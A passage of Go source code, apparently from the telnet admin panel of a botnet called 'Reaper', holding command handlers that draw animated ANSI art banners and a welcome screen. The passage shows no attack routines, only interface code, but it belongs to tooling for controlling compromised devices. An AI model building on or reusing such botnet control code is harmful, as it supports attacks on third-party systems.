			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                                            ██    \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "ROOTED" || cmd == "rooted" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗███████╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   █████╗  \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗       ██╗██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗     ██╔╝╚════██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║    ██╔╝  █████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║    ╚██╗  ╚═══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝     ╚██╗██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝       ╚═╝╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
				if err != nil || cmd == "DAD" || cmd == "dad" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}
		  /*--------------------------------------------------------------------------------------------------------------------------------------------*/      
				if err != nil || cmd == "reaper" || cmd == "REAPER" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;35m                ...                               \r\n"))
            this.conn.Write([]byte("\033[1;35m              ;::::;                              \r\n"))
            this.conn.Write([]byte("\033[1;35m            ;::::; :;                             \r\n"))
            this.conn.Write([]byte("\033[1;35m          ;:::::'   :;                            \r\n"))
            this.conn.Write([]byte("\033[1;35m         ;:::::;     ;.                           \r\n"))
            this.conn.Write([]byte("\033[1;35m        ,:::::'       ;           OOO             \r\n"))
            this.conn.Write([]byte("\033[1;35m        ::::::;       ;          OOOOO            \r\n"))
            this.conn.Write([]byte("\033[1;35m        ;:::::;       ;         OOOOOOOO          \r\n")) 
            this.conn.Write([]byte("\033[1;35m       ,;::::::;     ;'         / OOOOOOO         \r\n"))
            this.conn.Write([]byte("\033[1;35m     ;:::::::::`. ,,,;.        /  / DOOOOOO       \r\n")) 
            this.conn.Write([]byte("\033[1;35m   .';:::::::::::::::::;,     /  /     DOOOO      \r\n")) 
            this.conn.Write([]byte("\033[1;35m  ,::::::;::::::;;;;::::;,   /  /        DOOO     \r\n")) 
            this.conn.Write([]byte("\033[1;35m ;`::::::`'::::::;;;::::: ,#/  /          DOOO    \r\n")) 
            this.conn.Write([]byte("\033[1;35m :`:::::::`;::::::;;::: ;::#  /            DOOO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m ::`:::::::`;:::::::: ;::::# /              DOO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m `:`:::::::`;:::::: ;::::::#/               DOO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m  :::`:::::::`;; ;:::::::::##                OO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m  ::::`:::::::`;::::::::;:::#                OO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m  `:::::`::::::::::::;'`:;::#                O    \r\n")) 
            this.conn.Write([]byte("\033[1;35m   `:::::`::::::::;' /  / `:#                     \r\n")) 
            this.conn.Write([]byte("\033[1;35m                                                  \r\n"))
            this.conn.Write([]byte("\033[1;35m           Welcome To The Reaper Botnet           \r\n"))
            this.conn.Write([]byte("\033[1;35m              Type ? To Get Started               \r\n"))
            this.conn.Write([]byte("\033[1;35m                                                  \r\n"))
            continue
        }
		           if err != nil || cmd == "cute1" || cmd == "CUTE1" {
